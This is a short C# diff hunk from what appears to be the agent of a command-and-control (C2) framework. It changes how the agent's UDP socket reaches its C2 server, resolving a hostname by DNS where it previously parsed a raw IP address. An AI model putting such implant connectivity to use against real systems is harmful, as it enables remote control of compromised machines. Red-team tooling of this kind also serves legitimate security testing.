@@ -30,7 +30,7 @@ public class AgentUDPSocket
                 // connect to the UDP socket in configuration
                 Console.WriteLine("Linking to the C2 via {0}", configuration.C2URI);
                 uClient = new UdpClient();
-                endpoint = new IPEndPoint(IPAddress.Parse(ServerAddress), Port);
+                endpoint = new IPEndPoint(System.Net.Dns.GetHostAddresses(ServerAddress)[0], Port);
                 uClient.Connect(endpoint);
                 Console.WriteLine("The UDP connection is successfully established.");
             }
